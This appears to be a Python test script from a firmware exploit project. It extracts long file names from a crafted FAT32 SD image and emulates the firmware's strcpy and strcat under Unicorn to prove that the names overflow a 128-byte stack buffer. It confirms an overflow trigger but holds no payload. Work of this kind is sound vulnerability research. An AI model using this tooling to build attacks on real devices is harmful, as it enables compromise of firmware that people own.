#!/usr/bin/env python3
"""End-to-segment test: LFN names extracted from evil.raw -> Unicorn strcpy.

Closes the loop between the SD image (tools/make_evil_sd.py) and the
overflow primitive (tools/prove_overflow.py): parses every LFN name out
of the image with pure-python FAT reading, then runs each name longer
than 127 chars through the firmware's own strcpy@1079bff4 / strcat@101d7f48
under Unicorn/Thumb with a 128B stack buffer + canary.

Usage: python3 tools/test_evil_unicorn.py /tmp/evil.raw
Requires: unicorn 2.x. No mounting, no flashing, no hardware.
"""

import struct
import sys

BIN = "firmware/1.1.2_APPS.bin"
BASE_V = 0x1013a000
BASE_OFF = 0x76000
STRCAT_OFF = 0x101d7f48 - BASE_V + BASE_OFF
STRCPY_OFF = 0x1079bff4 - BASE_V + BASE_OFF
SECTOR = 512

from unicorn import Uc, UC_ARCH_ARM, UC_MODE_THUMB  # noqa: E402
from unicorn.arm_const import (UC_ARM_REG_LR, UC_ARM_REG_R0,  # noqa: E402
                               UC_ARM_REG_R1, UC_ARM_REG_SP)

CODE_BASE, STACK_BASE, STACK_SIZE = 0x10000, 0x20000, 0x2000


def extract_lfn_names(img: bytes):
    """Walk FAT32 image, return list of LFN long names."""
    start = struct.unpack("<I", img[446 + 8:446 + 12])[0]
    boot = img[start * SECTOR:start * SECTOR + SECTOR]
    bps, spc, rsv, fats = struct.unpack("<HBHB", boot[11:17])
    fsz = struct.unpack("<I", boot[36:40])[0]
    dstart = start + rsv + 2 * fsz
    fatraw = img[(start + rsv) * SECTOR:(start + rsv) * SECTOR + fsz * SECTOR]
    fat = struct.unpack(f"<{len(fatraw) // 4}I", fatraw)

    def walk(c):
        while c < 0x0FFFFFF8:
            yield c
            c = fat[c]

    def entries(c):
        raw = b"".join(img[(dstart + (cc - 2) * spc) * SECTOR:
                           (dstart + (cc - 2) * spc + spc) * SECTOR] for cc in walk(c))
        out, i = [], 0
        while i + 32 <= len(raw):
            e = raw[i:i + 32]
            i += 32
            if e[0] == 0x00:
                break
            if e[0] != 0xE5:
                out.append(e)
        return out

    names, pending = [], []

    def walkdir(c):
        for e in entries(c):
            if e[11] == 0x0F:
                pending.append(e)
                continue
            if pending:
                units = []
                for le in sorted(pending, key=lambda x: x[0] & 0x1F):
                    chunk = le[1:11] + le[14:26] + le[28:32]
                    units += struct.unpack("<13H", chunk)
                s = "".join(chr(u) for u in units).split("\x00")[0].rstrip("\uffff")
                names.append(s)
                pending.clear()
            if e[11] & 0x10 and e[0:11] not in (b".          ", b"..         "):
                clus = struct.unpack("<H", e[26:28])[0] | (struct.unpack("<H", e[20:22])[0] << 16)
                if clus >= 2:
                    walkdir(clus)

    walkdir(2)
    return names


def smash(dst_len: int, name: str, off: int, what: str) -> bool:
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
    blob = open(BIN, "rb").read()[off:off + 0x80]
    mu.mem_map(CODE_BASE, 0x1000)
    mu.mem_write(CODE_BASE, blob)
    mu.mem_map(STACK_BASE, STACK_SIZE)
    mu.mem_write(STACK_BASE, b"\x00" * STACK_SIZE)
    dst = STACK_BASE + 0x100
    mu.mem_write(dst, b"fs:/card0/mod/\x00")
    mu.mem_write(dst + 0x200, name.encode() + b"\x00")
    mu.mem_write(dst + 128, b"CANARY!!")
    mu.reg_write(UC_ARM_REG_R0, dst)
    mu.reg_write(UC_ARM_REG_R1, dst + 0x200)
    mu.reg_write(UC_ARM_REG_SP, STACK_BASE + STACK_SIZE - 4)
    mu.reg_write(UC_ARM_REG_LR, CODE_BASE + 0x500 | 1)
    try:
        mu.emu_start(CODE_BASE | 1, CODE_BASE + len(blob), timeout=2 * 10**6)
    except Exception:
        pass
    return bytes(mu.mem_read(dst + 128, 8)) != b"CANARY!!"


def main():
    img = open(sys.argv[1], "rb").read()
    names = extract_lfn_names(img)
    print(f"LFN names in image: {len(names)}")
    tested = smashed = 0
    for n in names:
        if len(n) < 128:
            continue
        tested += 1
        r1 = smash(128, n, STRCAT_OFF, "strcat")
        r2 = smash(128, n, STRCPY_OFF, "strcpy")
        print(f"  len={len(n):3d} strcat={'SMASH' if r1 else 'ok':5s} "
              f"strcpy={'SMASH' if r2 else 'ok':5s}  {n[:24]}...")
        smashed += (r1 or r2)
    print(f"{smashed}/{tested} long names smash a 128B stack buffer. "
          f"{'(trigger segment PROVEN)' if smashed else '(no smash)'}")
    return 0 if smashed else 1


if __name__ == "__main__":
    sys.exit(main())
